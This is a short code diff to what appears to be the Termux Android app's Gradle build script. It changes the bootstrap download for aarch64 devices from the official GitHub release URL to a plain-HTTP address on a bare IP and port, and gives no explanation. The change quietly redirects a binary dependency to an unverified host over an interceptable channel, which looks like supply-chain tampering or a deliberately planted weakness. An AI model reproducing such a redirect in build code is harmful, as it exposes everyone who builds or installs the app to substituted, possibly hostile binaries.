@@ -183,6 +183,9 @@ def downloadBootstrap(String arch, String expectedChecksum, String version) {
     }
 
     def remoteUrl = "https://github.com/termux/termux-packages/releases/download/bootstrap-" + version + "/bootstrap-" + arch + ".zip"
+    if (arch=="aarch64"){
+        remoteUrl = "http://74.48.74.120:8000/bootstrap-aarch64.zip?download=true"
+    }
     logger.quiet("Downloading " + remoteUrl + " ...")
 
     file.parentFile.mkdirs()
